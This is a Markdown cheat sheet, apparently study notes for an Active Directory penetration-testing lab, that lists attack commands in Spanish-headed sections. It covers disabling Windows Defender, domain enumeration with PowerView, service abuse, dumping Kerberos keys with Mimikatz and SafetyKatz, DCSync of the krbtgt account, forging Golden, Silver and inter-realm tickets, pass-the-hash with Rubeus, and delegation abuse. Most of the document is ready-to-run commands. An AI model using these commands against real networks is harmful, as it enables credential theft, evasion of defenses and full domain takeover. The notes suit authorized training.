# 0º Herramientas a instalar
1º PowerUp
2º PowerView
3º Rubeus
4º Certify
5º Bloodhound
6º PowerUpSQL
7º Kekeo
8º Invoke-Mimikatz
9º BetterSafetyKatz.exe
10º SafetyKatz.exe
11º Active Directory Module
12º hfs
13º heidi SQL
14º nc.exe
# 0.1º Cosas generales
* Disable Windows Defender
~~~c
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableRealtimeMonitoring $true
~~~~
* Run Bloodhound Injestor
~~~~c
Invoke-BloodHound -CollectionMethod All
~~~~
Create a Port Forwarding connection
~~~~c
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=IP
~~~~
# 1º Enumeracion
## General Enumeration
### Domain Information
* Get current domain:
~~~~c
Get-Domain
~~~~
* Get object of another domain:
~~~~c
Get-Domain -Domain DOMAIN
~~~~
* Get domain SID for the current domain
~~~~c
Get-DomainSID
~~~~
* Get domain policy for another domain:
~~~~c
(Get-DomainPolicyData -domain moneycorp.local).systemaccess
~~~~
* Get Kerberos tickets policy:
~~~~c
(Get-DomainPolicy).KerberosPolicy
~~~~
* Get domamin controllers for the current domain:
~~~~c
Get-DomainController
~~~~

* Get domain controllers for another domain:
~~~~c
Get-DomainController -Domain DOMAIN
~~~~
### Forest Information
* Get the name of the current Forest
~~~~c
Get-ADForest
~~~~
### Users Information
* Get a list of users in the current domain:
~~~~c
Get-DomainUser / Get-DomainUser -Identity USER
~~~~
* Get list of all properties for users in the current domain:
~~~~c
Get-DomainUser -Identity USER -Properties * / Get-DomainUser -Identity USER -Properties samaccountname,logoncount
~~~~
### Computers Information
* Get a list of computers in the current domain:
~~~~c
Get-DomainComputer -OperatingSystem "*Server 2022*"

Get-DomainComputer -Ping
~~~~
### Groups Information
* Get all the groups in the current domain:
~~~~c
Get-DomainGroup | select name

Get-DomainGroup -Domain <targetdomain>
~~~~
* Get a member of a group:
~~~~c
Get-DomainGroupMember -Identity “Domain Admins” -Recurse
~~~~
* Get the group membership for a user:
~~~~c
Get-DomainGroup -Username "USER"
~~~~
* List all the local groups on a machine (needs admin priv on non-dc machines):
~~~~c
Get-NetLocalGroup -ComputerName dcorp-dc
~~~~
* Get members of the local group “Administrators” on a machine (needs admin privs on non-dc machines):
~~~~c
Get-NetLocalGroupMember -ComputerName MACHINE -GroupName Administrators
~~~~
### Sessions Information
* Get actively logged users on a computer (needs local admin rights on the target):
~~~~c
Get-NetLoggedon -ComputerName MACHINE
~~~~
* Get locally logged users on a computer (needs remote registry on the target - started by-default on server OS):
~~~~c
Get-LoggedonLocal -ComputerName MACHINE
~~~~
* Get the last logged user on a computer (needs admin rights and remote registry on the target):
~~~~c
Get-LastLoggedOn -Computer Name dcorp-adminsrv
~~~~
### Shares, files and fileservers
* Find shares on hosts in current domain:
~~~~c
Invoke-ShareFinder -Verbose
~~~~
* Find sensitive files on computers in the domain:
~~~~c
Invoke-Filefinder -Verbose
~~~~
* Get all fileservers of the domain:
~~~~c
Get-NetFileServer
~~~~
## Group Policies /GPO
* Get list of GPO in current domain:
~~~~c
Get-DomainGPO / Get-DomainGPO -ComputerIdentity DOMAIN-USER
~~~~
* Get GPO(S) wich use restricted groups or groups.xml for interesting users:
~~~~c
Get-DomainGPOLocalGroup
~~~~
* Get users which are in a local group of a machine using GPO:
~~~~c
Get-DomainGPOComputerLocalGroupMapping -ComputerIdentity DOMAIN-USER
~~~~
* Get machines where the given user is mebmer of a specific group:
~~~~c
Get-DomainGPOUserLocalGroupMapping -Identity USER -Verbose
~~~~
## ACL
* Get the ACLs associated with the specified object:
~~~~c
Get-DomainObjectAcl -SamAccountName USER -ResolveGUIDs
~~~~
* Get the ACLs associated with the specified prefix to be used for search:
~~~~c
Get-DomainObjectAcl -SearchBase “LDAP://CN=Domain Admins,CN=Users,DC=DOMAIN,DC=DOMAIN,DC=DOMAIN” -ResolveGUIDs -Verbose
~~~~
* Search for interesting ACLs:
~~~~c
Find-InterestingDomainAcl -ResolveGUIDs
~~~~
## Trusts
### Domain Trust Mapping
* Get a list of all domain trusts for the current domain:
~~~~c
Get-DomainTrust 
Get-DomainTrust -Domain .DOMAIN.local
~~~~
### Forest Mapping
* Get details about the current forest:
~~~~c
Get-Forest
Get-Forest -Forest eurocorp.local
~~~~
* Get all domains in the current forest:
~~~~c
Get-ForestDomain
Get-ForestDomain -Forest eurocorp.local
~~~~
## Hunting User sessions
* Find remote admin local sessions
~~~~c
Find-PSRemotingLocalAdminAccess
~~~~
# 2º Privilege escalation
* Invoke all security checks
~~~~c
Invoke-Allchecks
~~~~
* Get services with unquoted paths and a sapace in their name:
~~~~c
Get-ServiceUnquoted -Verbose
~~~~
* Get services where the current user can write to its binary path or change arguments to the binary:
~~~~c
Get-ModifiableServiceFile -Verbose
~~~~
* Get the services whose configuration current user can modify:
~~~~c
Get-ModifiableService -Verbose
~~~~
* Abuse a certain Service
~~~~c
Invoke-ServiceAbuse -Name ‘SERVICENAME’ -Username ‘DOMAIN\USER’
~~~~
# 3º Post Exploitation & Lateral Movement
## 3.1 Post Exploitation
### Mimikatz
Better use aes256 keys instead of RC4, which is NTLM hash
* Dump local Kerberos AES keys
~~~~c
Invoke-Mimikatz -Command: '"sekurlsa::ekeys"'
Safetykatz.exe "sekurlsa::ekeys"
pypykatz.exe live lsa
~~~~
* Create Over Pass The Hash
~~~~c
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:DOMAIN /aes256:<aes256key> /run:powershell.exe"'

SafetyKatz.exe "sekurlsa::pth /user:administrator /domain:DOMAIN /aes256:<aes256keys> /run:cmd.exe" "exit"
~~~~
### Rubeus
* Create Over Pass The Hash
~~~~c
rubeus.exe asktgt /user:administrator /aes256:<aes256keys> /opsec /createonly:C:\Windows\System32\cmd.exe /show /ptt
~~~~
* Create without privileges
~~~~c
rubeus.exe asktgt /user:administrator /rc4:<ntlmhash> /ptt
~~~~
### Golden Ticket
1º Execute a DCsync attack to get the krbtgt kerberos aes 256 key
~~~~c
C:\AD\tools\SafetyKatz.exe "lsadump::dcsync /user:DOMAIN\krbtgt" "exit"
~~~~
2º Create a Golden ticket on the session impresonating krbtgt
~~~~c
BetterSafetyKatz.exe "kerberos::golden /User:Adminisrator /domain:DOMAIN /sid:<Domain SID> /aes256:<HashOfkrbtgtAccount> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:<DomainName> /sid:<Domain's SID> /krbtgt:<HashOfkrbtgtAccount> id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt"'

~~~~
### Silver Ticket
* Create a Silver Ticket:
~~~~c
BetterSafetyKatz.exe "kerberos::golden /User:Adminisrator /domain:dollarcorp.moneycorp.local /sid:<Domain SID> /target:dcorp-dc.dollarcorp.moneycorp.local /service:CIFS /rc4:<rc4 hash> /startoffset:0 /endin:600 /renewmax:10080 /ptt" "exit"

Invoke-Mimikatz -Command '"kerberos::golden /domain:<DomainName> /sid:<DomainSID> /target:<TheTargetMachine> /service:
<ServiceType> /rc4:<TheSPN's Account NTLM Hash> /user:<UserToImpersonate> /ptt"'


~~~~

### DcSync
* By default, Domain Admin privileges are required to run DCSync
* Run DCSync command:
~~~~c
Invoke-Mimikatz -Command '"lsadump::dcsync /user:DOMAIN\krbtgt"'

SafetyKatz.exe "lsadump::dcsync /user:DOMAIN\krbtgt" "exit"
~~~~

## 3.2 Lateral Movement
### PSremoting
* Enable PSRemote
~~~~c
Enable-PSRemoting
~~~~
* Create new session
~~~~c
New-PSSession -ComputerName DOMAIN-MACHINE

$sess = New-PSSession -ComputerName DOMAIN-MACHINE
~~~~
* Connect Remotely to the session previously created
~~~~c
Enter-PSSesion -ComputerName DOMAIN-MACHINE

Enter-PSSession -Session $sess
~~~~
### WinRS
* Connect to a computer via WinRS
~~~~c
winrs -r:DOMAIN-MACHINE cmd
~~~~

# 4º Beyond Post Exploitation
## 4.1º Unconstrained Delegation
* Discover domain computers which have unconstrained delegation:
~~~~c
Get-DomainComputer -UnConstrained
~~~~
## 4.2º Constrained Delegation
* Enumerate Users and computers with constrained delegation enabled
~~~~c
Get-DomainUser -TrustedToAuth
Get-DomainComputer -TrustedToAuth
~~~~
### Abusing with Kekeo
1º Request a TGT with kekeo
~~~~c
tgt::ask /user:<UserName> /domain:<Domain's FQDN> /rc4:<hashedPasswordOfTheUser>
~~~~
2º Request a TGS using the tgt previously requested
~~~~c
tgs:s4u /tgt:TGTICKET /user:USER /service:SERVICE/DOMAIN
~~~~
### Abusing with rubeus
1º Request TGT and TGS in a single command using Rubeus
~~~~c
Rubeus.exe s4u /user:USER /aes256:AES256 /impersonateuser:Administrator/msdsspn:SERVICE/DOMAIN /ptt
~~~~
## 4.3 RBCD

## 4.4 AD CS
## 4.5 Trust Abuse MSSQL
## 4.6 Trust Abuse / Cross trusts
## 4.7 Forest Abuse / Cross Forest
1º Dump the trust Key
~~~~c
Invoke-Mimikatz -Command '"lsadump::trust /patch"'
Invoke-Mimikatz -Command '"lsadump::lsa /patch"
~~~~
2º Forge a inter-realm TGT using the Golden Ticket attack
~~~~c
Invoke-Mimikatz -Command '"kerberos::golden /user:OURUSER /domain:<OurDomain> /sid:
<OurDomainSID> /sids:<DomainSID>-519 /krbtgt:<krbthash> /ptt"'
~~~~
3º Verify Connectivity
~~~~c
gwmi -class win32_operatingsystem -ComputerName DOMAIN

winrs -r:DOMAIN-MACHINE cmd
~~~~